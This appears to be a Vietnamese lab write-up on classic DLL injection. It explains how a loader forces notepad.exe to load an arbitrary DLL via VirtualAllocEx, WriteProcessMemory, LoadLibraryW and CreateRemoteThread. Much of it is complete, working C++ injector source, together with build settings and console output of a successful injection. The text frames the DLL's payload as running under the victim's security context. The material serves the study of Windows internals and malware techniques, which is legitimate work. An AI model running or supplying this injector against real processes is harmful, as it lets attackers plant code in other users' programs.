
---

# 📝 [PE 05] Classic DLL Injection

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Classic DLL Injection (Tiêm nhiễm thư viện liên kết động truyền thống)** đại diện cho mô hình can thiệp mô-đun phổ biến và kinh điển nhất trong kiến trúc hệ điều hành Windows.

Khác với các giải pháp bơm mã máy trực tiếp (Code/Shellcode Injection - PE 01 đến PE 04), giải thuật này không thực hiện sao chép các byte thực thi đơn lẻ (Opcode) vào RAM đối phương. Thay vào đó, Loader thực hiện **cưỡng bách tiến trình mục tiêu tự động nạp một tệp thư viện liên kết động (`.dll`) hoàn chỉnh từ đĩa cứng** vào không gian địa chỉ ảo của nó. Ngay khi mô-đun nhị phân này được ánh xạ, hàm khởi tạo đặc trưng **`DllMain`** sẽ lập tức kích nổ lọt lòng tiến trình đích dưới tư cách pháp nhân hợp pháp của nạn nhân, thừa hưởng toàn bộ Token bảo mật và đặc quyền của tiến trình vỏ bọc.

### 🎯 Mục tiêu nghiên cứu:

* **Mổ xẻ cơ chế Windows PE Loader**: Nghiên cứu quy trình nạp, ánh xạ mô-đun Image và xử lý các phân đoạn phụ thuộc của hệ điều hành Windows.
* **Làm chủ kỹ nghệ Ép nạp Mô-đun Từ xa**: Khai thác đặc tính thiết kế của hàm API hệ thống `LoadLibrary` để điều hướng luồng thực thi chéo tiến trình.
* **Bảo toàn cấu trúc chuỗi thích ứng**: Áp dụng quy trình cấp phát động thích ứng đường dẫn tệp tin (Zero Static Buffers) nhằm triệt tiêu hoàn toàn nguy cơ tràn bộ đệm tĩnh của các mảng cố định.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Khi một ứng dụng chuẩn chỉ yêu cầu triệu hồi một tệp DLL, nó sẽ gọi hàm Subsystem `LoadLibrary`. Trình nạp PE Loader của Windows sẽ tiếp nhận, bốc tệp tin từ đĩa cứng, ánh xạ cấu trúc các phân đoạn PE lên RAM, phân giải bảng Import Address Table (IAT) và kích hoạt sự kiện **`DLL_PROCESS_ATTACH`** lọt lòng inside `DllMain`.

Quy trình toán học giải phẫu và ép nạp Image mô-đun chéo tiến trình của Lab PE 05 diễn ra qua 4 giai đoạn ngầm tại tầng Kernel:

```
[VirtualAllocEx: Cấp phát ô chứa đường dẫn]
       └──> [WriteProcessMemory: Bơm chuỗi đường dẫn tệp DLL]
                 └──> [Định vị tọa độ LoadLibraryW chéo RAM]
                           └──> [CreateRemoteThread: Khai hỏa PE Loader từ xa]

```

1. **Khắc vạch ô chứa dữ liệu từ xa (`VirtualAllocEx`)**: Do hàm hệ thống `LoadLibraryW` yêu cầu tham số đầu vào là một con trỏ trỏ đến chuỗi ký tự Wide-character chứa đường dẫn của tệp DLL, Loader không thể truyền con trỏ cục bộ sang RAM đối phương do tính cô lập không gian địa chỉ ảo. Loader buộc phải sử dụng `VirtualAllocEx` để khởi tạo một trang nhớ mang cờ bảo vệ **`PAGE_READWRITE` (RW)** bên lòng tiến trình đích với kích thước vừa khít độ dài chuỗi ký tự.
2. **Ánh xạ chuỗi đường dẫn (`WriteProcessMemory`)**: Ghi dữ liệu chuỗi đường dẫn tệp DLL vật lý (ví dụ: `L"C:\\Windows\\System32\\panda.dll"`) xuyên biên giới vào không gian ảo `RW` vừa được mở khóa của nạn nhân.
3. **Phân giải tọa độ Subsystem đồng bộ**: Một đặc tính toán học cốt lõi của kiến trúc Windows Subsystem là các thư viện lõi hệ thống như `kernel32.dll` và `ntdll.dll` đều được **ánh xạ (Map) vào cùng một tọa độ Base Address giống nhau trên RAM của mọi tiến trình** (tính năng ASLR chỉ cố định địa chỉ một lần duy nhất cho mỗi chu kỳ khởi động hệ điều hành). Do đó, tọa độ tuyệt đối của hàm **`LoadLibraryW`** trích xuất được từ RAM của Loader chính là địa chỉ tuyệt đối của hàm này bên lòng tiến trình `notepad.exe`.
4. **Cưỡng bách nạp mô-đun từ xa (`CreateRemoteThread`)**: Loader khởi tạo một Thread Object mới lọt lòng tiến trình đích, thiết lập con trỏ chỉ mục lệnh **`Rip`** trỏ thẳng vào tọa độ hàm `LoadLibraryW`, đồng thời nạp con trỏ ô nhớ chứa chuỗi đường dẫn từ xa vào thanh ghi tham số **`Rcx`**. CPU của đối phương thức dậy, tiếp nhận tham số đường dẫn và tự động kích hoạt trình nạp PE Loader để kéo file DLL vào không gian ảo của nó.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** – tự động hóa tính toán kích thước chuỗi Wide Character (`wchar_t`) thích ứng kịch trần bảo mật hệ thống.

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// Bộ quét RAM động tự động nhận diện PID tiến trình, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 05: CLASSIC DLL INJECTION REMOTE PROCESS" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad truoc." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    // Đường dẫn tĩnh của DLL giả định (Có thể linh hoạt cấu hình đường dẫn tệp tin độc lập)
    std::wstring dllPath = L"C:\\Users\\Admin\\source\\repos\\Task6\\panda.dll";

    // QUY TRÌNH THÍCH ỨNG: Tính toán độ rộng byte vừa khít, triệt tiêu hoàn toàn mảng cố định buffers
    SIZE_T pathSizeInBytes = (dllPath.length() + 1) * sizeof(wchar_t); 

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed! Quyen han CLI hien tai bi gioi han." << std::endl;
        return EXIT_FAILURE;
    }

    // ─── BƯỚC 1: CẤP PHÁT VÙNG NHỚ TỪ XA CHỨA CHUỖI ĐƯỜNG DẪN ───
    std::cout << "[*] Dang yeu cau cap phat o nho chua chuoi duong dan DLL tu xa..." << std::endl;
    LPVOID remotePathBuffer = VirtualAllocEx(hProcess, NULL, pathSizeInBytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (!remotePathBuffer) {
        std::cerr << "[-] VirtualAllocEx failed!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] O nho mang quyen RW tu xa da thiet lap tai: 0x" << std::hex << remotePathBuffer << std::endl;

    // ─── BƯỚC 2: BƠM CHUỖI ĐƯỜNG DẪN XUYÊN BIÊN GIỚI TIẾN TRÌNH ───
    BOOL isWritten = WriteProcessMemory(hProcess, remotePathBuffer, dllPath.c_str(), pathSizeInBytes, NULL);
    if (!isWritten) {
        std::cerr << "[-] WriteProcessMemory that bai!" << std::endl;
        VirtualFreeEx(hProcess, remotePathBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Ghi chuoi duong dan Wide-char sang RAM Notepad hoan tat." << std::endl;

    // ─── BƯỚC 3: PHÂN GIẢI ĐỊA CHỈ TUYỆT ĐỐI CỦA HÀM LOADLIBRARYW ───
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE pLoadLibraryW = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
    
    if (!pLoadLibraryW) {
        std::cerr << "[-] Khong the dinh vi con tro LoadLibraryW!" << std::endl;
        VirtualFreeEx(hProcess, remotePathBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Toa do tuyet doi dong bo cua LoadLibraryW hien lung: 0x" << std::hex << (PVOID)pLoadLibraryW << std::endl;

    // ─── BƯỚC 4: KHỞI TẠO LUỒNG TỪ XA ÉP NOTEPAD TỰ LOAD LIBRARY ───
    std::cout << "[*] Dang cuong buc sinh luong CreateRemoteThread tu xa de kich no..." << std::endl;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryW, remotePathBuffer, 0, NULL);

    if (hThread != NULL) {
        // Đồng bộ hóa luồng, tạm hoãn Loader cho đến khi mục tiêu hoàn tất quy trình ánh xạ Image mô-đun
        WaitForSingleObject(hThread, INFINITE); 
        std::cout << "[+] Classic DLL Injection Successful! DLL da nam tron trong long Notepad." << std::endl;
        CloseHandle(hThread);
    } else {
        std::cerr << "[-] CreateRemoteThread that bai! Error Code: " << GetLastError() << std::endl;
    }

    // Thu hồi vùng nhớ chứa chuỗi thô từ xa và giải phóng tài nguyên Handle phẳng sạch kịch trần
    VirtualFreeEx(hProcess, remotePathBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh chu ky song. Nhan phim Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để bảo đảm file thực thi `.exe` cùng tệp tin mô-đun nhị phân `.dll` phụ thuộc vận hành mượt mà, độc lập, không dính lỗi thiếu môi trường liên kết động (CRT Dependencies) khi triển khai thực nghiệm:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Thiết lập thanh công cụ quản lý dự án ở chính xác cấu hình **`Release`** và nền tảng kiến trúc **`x64`**.
2. Truy cập: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số thuộc tính `Runtime Library`, chuyển cấu hình sang cờ **`Multi-threaded (/MT)`** nhằm liên kết tĩnh toàn bộ thư viện hệ thống lọt lòng file nhị phân.

> **Vị trí đặt ảnh minh chứng cấu hình biên dịch hệ thống:**
> 

3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin sạch bóng lỗi chuỗi hệ thống.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy tiến trình vỏ bọc `Notepad.exe` trên môi trường máy Lab, mở PowerShell ngoài đĩa thô thực thi tệp tin dự án để theo dõi ma trận căn lề logic:

```powershell
PS C:\Workspace\x64\Release> .\PE05_Classic_DLL_Injection.exe
====================================================
[*] PE 05: CLASSIC DLL INJECTION REMOTE PROCESS
====================================================
[+] Da tim thay Notepad.exe voi PID: 16840
[*] Dang yeu cau cap phat o nho chua chuoi duong dan DLL tu xa...
[+] O nho mang quyen RW tu xa da thiet lap tai: 0x0000018E24C10000
[+] Ghi chuoi duong dan Wide-char sang RAM Notepad hoan tat.
[+] Toa do tuyet doi dong bo cua LoadLibraryW hien lung: 0x00007ffd31a2c510
[*] Dang cuong buc sinh luong CreateRemoteThread tu xa de kich no...
[+] Classic DLL Injection Successful! DLL da nam tron trong long Notepad.

[*] Hoan thanh chu ky song. Nhan phim Enter de dong cua so...

```

> **Vị trí đặt ảnh minh chứng thực nghiệm tiêm nhiễm mô-đun Image:**
> 

### 🎯 Phân tích hệ quả cấu trúc RAM kịch trần:

* Khi tiến hành thẩm định không gian bộ nhớ ảo ảo hóa và danh sách mô-đun đã tải (**Loaded Modules**) của tiến trình mục tiêu `notepad.exe` thông qua các công cụ trinh sát chuyên sâu (như `Process Hacker` hoặc `Process Explorer`), tệp tin **`panda.dll`** xuất hiện chễm chệ, chiếm giữ một phân vùng thuộc tính `MEM_IMAGE` hợp pháp lọt lòng không gian ảo của Notepad.
* Cơ chế `DLL_PROCESS_ATTACH` kích nổ thành công logic Payload (mở Máy tính hoặc thực thi mã ngầm) hoàn toàn trùng khớp với ngữ cảnh bảo mật của nạn nhân, kết thúc chu kỳ thí nghiệm một cách hoàn hảo kịch khung!

---